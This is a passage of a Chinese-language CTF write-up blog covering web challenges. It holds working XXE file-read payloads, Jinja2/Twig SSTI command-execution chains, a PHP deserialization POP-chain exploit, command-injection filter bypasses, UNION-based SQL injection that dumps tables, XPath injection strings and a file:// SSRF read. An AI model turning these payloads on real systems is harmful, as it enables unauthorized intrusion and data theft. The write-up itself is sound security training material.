class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">外部</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span> #定义元素为ANY，即可以接受任何元素。</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span> // 定义通用实体</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span> #定义一个外部实体</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="判读是否存在XXE漏洞："><a href="#判读是否存在XXE漏洞：" class="headerlink" title="判读是否存在XXE漏洞："></a>判读是否存在XXE漏洞：</h5><p><strong>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</strong></p>
<p>总共有三个文件可以解析就是do m.php,SimpleXMLElement.php,simplexml_load_string.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//dom.php文件源码</span><br><span class="line">&lt;?php</span><br><span class="line">$data = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后构造一下payload，读取flagggg.php中的flag，然后base64解码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 14.29.40.png" alt="截屏2025-02-27 14.29.40" style="zoom:25%;" /></p>
<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>php常见的模板：twig，smarty，blade</p>
<p>可以使用<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap"><code>tplmap</code></a>一把梭。</p>
<ul>
<li><p>注入思路：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>随便找一个内置类对象用__c1ass__拿到他所对应的类</span><br><span class="line"><span class="number">2.</span>用__bases__拿到基类(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="number">3.</span>用__subclasses__()拿到子类列表</span><br><span class="line"><span class="number">4.</span>在子类列表中直接寻找可以利用的类getshell</span><br><span class="line"></span><br><span class="line">对象-&gt; 类-&gt; 基本类-&gt; 子类-&gt; __init__方法-&gt; __globals__属性+_bui1tins属性-&gt; </span><br><span class="line"><span class="built_in">eval</span>函数</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">().__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li><p>常用方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__mro__             <span class="comment"># 查看继承关系和调用顺序，返回元组</span></span><br><span class="line">__base__            <span class="comment"># 返回基类</span></span><br><span class="line">__bases__           <span class="comment"># 返回基类元组</span></span><br><span class="line">__subclasses__()    <span class="comment"># 返回子类列表</span></span><br><span class="line">__init__            <span class="comment"># 调用初始化函数，可以用来跳到__globals__</span></span><br><span class="line">__globals__         <span class="comment"># 返回函数所在的全局命名空间所定义的全局变量，返回字典</span></span><br><span class="line">__builtins__        <span class="comment"># 返回内建内建名称空间字典</span></span><br><span class="line">__dic__             <span class="comment"># 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都</span></span><br><span class="line">是放在类的__dict__里</span><br><span class="line">__getattribute__()  <span class="comment"># 实例、类、函数都具有的__getattribute__魔术方法。事实上，</span></span><br><span class="line">在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__</span><br><span class="line">方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        <span class="comment"># 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，</span></span><br><span class="line">就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         <span class="comment"># 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名</span></span><br><span class="line">字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。</span><br><span class="line">__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           <span class="comment"># 动态加载类和函数，也就是导入模块，经常用于导入os模块，</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            <span class="comment"># 返回描写这个对象的字符串，可以理解成就是打印出来。</span></span><br><span class="line">url_for              <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">get_flashed_messages <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">lipsum               <span class="comment"># flask的一个方法，可以用于得到__builtins__，而且</span></span><br><span class="line">lipsum.__globals__含有os模块：&#123;&lt;!-- --&gt;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">.read()&#125;&#125;</span><br><span class="line">&#123;&lt;!-- --&gt;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          <span class="comment"># 应用上下文，一个全局变量</span></span><br><span class="line">request              <span class="comment"># 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。</span></span><br><span class="line">此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line">.<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1        <span class="comment"># get传参</span></span><br><span class="line">request.values.x1      <span class="comment"># 所有参数</span></span><br><span class="line">request.cookies          <span class="comment"># cookies参数</span></span><br><span class="line">request.headers          <span class="comment"># 请求头参数</span></span><br><span class="line">request.form.x1        <span class="comment"># post传参    (Content-Type:applicaation</span></span><br><span class="line">/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data           <span class="comment"># post传参    (Content-Type:a/b)</span></span><br><span class="line">request.json         <span class="comment"># post传json  (Content-Type: application/json)</span></span><br><span class="line">config                   <span class="comment"># 当前application的所有配置。此外，也可以这样&#123;&lt;!-- --&gt;</span></span><br><span class="line">&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">float</span>()            <span class="comment"># 将值转换为float类型；</span></span><br><span class="line">lower()            <span class="comment"># 将字符串转换为小写；</span></span><br><span class="line">upper()            <span class="comment"># 将字符串转换为大写；</span></span><br><span class="line">title()            <span class="comment"># 把值中的每个单词的首字母都转成大写；</span></span><br><span class="line">capitalize()        <span class="comment"># 把变量值的首字母转成大写，其余字母转小写；</span></span><br><span class="line">trim()            <span class="comment"># 截取字符串前面和后面的空白字符；</span></span><br><span class="line">wordcount()        <span class="comment"># 计算一个长字符串中单词的个数；</span></span><br><span class="line">reverse()        <span class="comment"># 字符串反转；</span></span><br><span class="line">replace(value,old,new)                        <span class="comment"># 替换将old替换为new的字符串；</span></span><br><span class="line">truncate(value,length=<span class="number">255</span>,killwords=<span class="literal">False</span>)  <span class="comment"># 截取length长度的字符串；</span></span><br><span class="line">striptags()       <span class="comment"># 删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span></span><br><span class="line">escape()或e       <span class="comment"># 转义字符，会将&amp;lt;、&amp;gt;等符号转义成HTML中的符号。显例：</span></span><br><span class="line">content|escape或content|e。</span><br><span class="line">safe()        <span class="comment"># 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。</span></span><br><span class="line">示例： &#123;&lt;!-- --&gt;&#123;<span class="string">&#x27;&amp;lt;em&amp;gt;hello&amp;lt;/em&amp;gt;&#x27;</span>|safe&#125;&#125;；</span><br><span class="line"><span class="built_in">list</span>()        <span class="comment"># 将变量列成列表；</span></span><br><span class="line">string()    <span class="comment"># 将变量转换成字符串；</span></span><br><span class="line">join()        <span class="comment"># 将一个序列中的参数值拼接成字符串。示例看上面payload；</span></span><br><span class="line"><span class="built_in">abs</span>()        <span class="comment"># 返回一个数值的绝对值；</span></span><br><span class="line">first()        <span class="comment"># 返回一个序列的第一个元素；</span></span><br><span class="line">last()        <span class="comment"># 返回一个序列的最后一个元素；</span></span><br><span class="line"><span class="built_in">format</span>(value,arags,*kwargs)    <span class="comment"># 格式化字符串。比如：&#123;&lt;!-- --&gt;&#123;&quot;%s&quot; - &quot;%s&quot;|</span></span><br><span class="line"><span class="built_in">format</span>(<span class="string">&#x27;Hello?&#x27;</span>,<span class="string">&quot;Foo!&quot;</span>) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line">length()    <span class="comment"># 返回一个序列或者字典的长度；</span></span><br><span class="line"><span class="built_in">sum</span>()        <span class="comment"># 返回列表内数值的和；</span></span><br><span class="line">sort()        <span class="comment"># 返回排序后的列表；</span></span><br><span class="line">default(value,default_value,boolean=false)    <span class="comment"># 如果当前变量没有值，则会使用参</span></span><br><span class="line">数中的值来代替。示例：name|default(<span class="string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来</span><br><span class="line">替代。boolean=<span class="literal">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果</span><br><span class="line">想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用<span class="keyword">or</span>来替换。</span><br><span class="line">length()    <span class="comment"># 返回字符串的长度，别名是count</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>找可用利用的类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这是个找可利用类的脚本，可供自行发掘利用链，想利用啥，就找啥</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line">class_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            class_name = <span class="built_in">str</span>(i).split(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(class_name, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> class_name:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;未找到含有“%s”的类，请尝试用其他包查找...&#x27;</span> % search)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>常用poc：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/shell.cfg&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">.write(<span class="string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>)&#125;&#125;           <span class="comment"># 返回None证明传递成功</span></span><br><span class="line">&#123;&#123;config.from_pyfile(<span class="string">&#x27;/tmp/shell.cfg&#x27;</span>)&#125;&#125;                     <span class="comment"># 返回True说明成功</span></span><br><span class="line">写shell</span><br><span class="line">&#123;&#123;config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;[shell_cmd_here]&#x27;</span>,shell=<span class="literal">True</span>)&#125;&#125;          <span class="comment"># 执行想要的shell</span></span><br><span class="line">命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line">.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>]</span><br><span class="line">.__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__base__.__base__.__base</span><br><span class="line">__[<span class="string">&#x27;__subcla&#x27;</span>+<span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">60</span>][<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__&#x27;</span>+<span class="string">&#x27;glo&#x27;</span>+<span class="string">&#x27;bal&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__bu&#x27;</span>+<span class="string">&#x27;iltins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__im&#x27;</span>+<span class="string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;)</span></span><br><span class="line"><span class="string">.re&#x27;</span>+<span class="string">&#x27;ad()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p>
<p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术方法</span><br><span class="line">__class__   ：返回类型所属的对象</span><br><span class="line">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   ：返回该对象所继承的父类</span><br><span class="line">__mro__     ：返回该对象的所有父类</span><br><span class="line"></span><br><span class="line">__subclasses__()  获取当前类的所有子类</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含(保存)函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
<p>构造payload<code>&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('cat /f*').read()&#125;&#125;</code>得到flag</p>
<h3 id="PlayGame"><a href="#PlayGame" class="headerlink" title="PlayGame"></a>PlayGame</h3><p>首先分析源码，pop链是<code>PlayGame.__destruct -&gt; User.__toString -&gt; PlayGame.__toString -&gt; PlayGame.openGame()</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 21.14.22.png" alt="截屏2025-02-27 21.14.22" style="zoom:50%;" /></p>
<ul>
<li>1、反序列化链的入口在魔法函数 <strong>destruct() ，调用对象后会立即触发 </strong>destruct() 函数输出$this-&gt;user-&gt;name.”GameOver!”。</li>
<li>2、 $this-&gt;user-&gt;name、$gameFile 两个参数可控，出口在 __toString() 函数，只有对象转换为字符时才会被调用，才会进入 openGame() 函数执行 file_get_contents($this-&gt;gameFile) ，去包含想要的文件。</li>
<li>3、flag文件路径未知，要怎么获取？</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayGame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gameFile</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">PlayGame</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;name=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;user=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;gameFile=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;PlayGame&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;PlayGame&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;gameFile&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;/flag&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;N;&#125;s:<span class="number">8</span>:<span class="string">&quot;gameFile&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>构造payload<code>?polar[flag.flag=O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:3:&#123;s:4:&quot;name&quot;;O:8:&quot;PlayGame&quot;:2:&#123;s:4:&quot;user&quot;;N;s:8:&quot;gameFile&quot;;s:5:&quot;/flag&quot;;&#125;s:3:&quot;age&quot;;N;s:3:&quot;sex&quot;;N;&#125;s:8:&quot;gameFile&quot;;N;&#125;</code>得到flag</p>
<h3 id="phpurl"><a href="#phpurl" class="headerlink" title="phpurl"></a>phpurl</h3><p>先把提示的内容<code>`aW5kZXgucGhwcw</code>用base64进行解码，得到<code>index.phps</code>,然后访问<code>index.phps</code></p>
<p>得到源码，进行分析，发现GET方法传入一个sys参数，然后用urlecode()进行加密了后面又判断了sys与xxs是否相等，那么看看经过多次url编码是否能获得flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.12.47.png" alt="截屏2025-02-28 14.12.47" style="zoom:50%;" /></p>
<p>构造payload<code>?sys=%25%37%38%25%37%38%25%37%33</code>,发现获得了flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.14.41.png" alt="截屏2025-02-28 14.14.41" style="zoom:25%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.15.00.png" alt="截屏2025-02-28 14.15.00" style="zoom:25%;" /></p>
<h3 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h3><p>首先是一个输入框，看题目的描述，试一下<code>127.0.0.1;id</code>发现可以返回，但是<code>tac</code>不可以执行,应该是过滤了，但是又不知道flag在哪，查看一下<code>t\ac%09index.php</code>发现返回了”那能让你直接读？”,那么就先读取index.php查看一下源码吧，构造一下payload <code>?ip=127.0.0.1;a=ind;b=ex;ta\c%09$a$b.php</code>访问网站看一下源码发现了flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 14.31.48.png" alt="截屏2025-02-28 14.31.48" style="zoom:25%;" /></p>
<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>首先是一个输入框，一眼sql注入啊，发现是一个POST的参数，那么直接测试</p>
<p>本题过滤了空格，那么直接/**/替换一下</p>
<p>sql注入步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 首先是判断有几个字段：&#x27;order by 1#</span><br><span class="line">2. 判断完之后直接用语句看看哪一个字段执行了返回了数据: &#x27;Union/**/Select/**/1,2,3,4,5#</span><br><span class="line">3. 直接查看数据库：&#x27;Union/**/Select/**/1,database(),3,4,5#</span><br><span class="line">4. 查看表名具体要分析一下：group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ </span><br><span class="line">5. 查看列名：group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">6.查看字段值：group_concat(id,username,password) from users --+</span><br></pre></td></tr></table></figure>
<p>查看表名<code>query=&#39;/**/Union/**/Select/**/1,group_concat(table_name),3,4,5/**/From/**/information_schema.tables/**/whEre/**/table_schema=database()/**/#</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.22.28.png" alt="截屏2025-02-28 15.22.28" style="zoom:25%;" /></p>
<p>查看列名<code>query=1&#39;/**/Union/**/Select/**/1,group_concat(column_name),3,4,5/**/From/**/information_schema.columns/**/whEre/**/table_schema=database()/**/and/**/table_name=&#39;Flag&#39;/**/#</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.22.04.png" alt="截屏2025-02-28 15.22.04" style="zoom:25%;" /></p>
<p>查看字段值<code>query=&#39;/**/Union/**/Select/**/1,group_concat(Flag),3,4,5/**/fRom/**/Flag/**/#</code></p>
<p>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 15.21.07.png" alt="截屏2025-02-28 15.21.07" style="zoom:50%;" /></p>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>首先判断了一下sql注入发现不是，考虑一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xpath注入利用Xpath解析器的松散输入和容错 i 特性，能够在URL、表单或其他信息上附带恶意的</span><br><span class="line">XPath查询代码，以获得高权限的访问权</span><br><span class="line"> Xpath注入类似于SQL注入，当网站实验未经正确处理的用户输入查询XML数据时，可能发生XPATH注入，</span><br><span class="line">由于Xpath种不像sql种有权限的概念，用户可通过提交恶意XPATH代码获得完整的xml文档权限。</span><br></pre></td></tr></table></figure>
<ul>
<li>payload：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;]|//*|//*[&#x27;</span><br><span class="line">&#x27;]|//*|ss[&#x27;</span><br><span class="line">&#x27;]|//*|//*[&#x27;</span><br><span class="line">&#x27;]|//*|*[&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="csdn"><a href="#csdn" class="headerlink" title="csdn"></a>csdn</h3><p>访问URL直接查看源码发现，直接构造payload<code>?xxs=file:///flag.txt</code>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 16.39.46.png" alt="截屏2025-02-28 16.39.46" style="zoom:50%;" /></p>
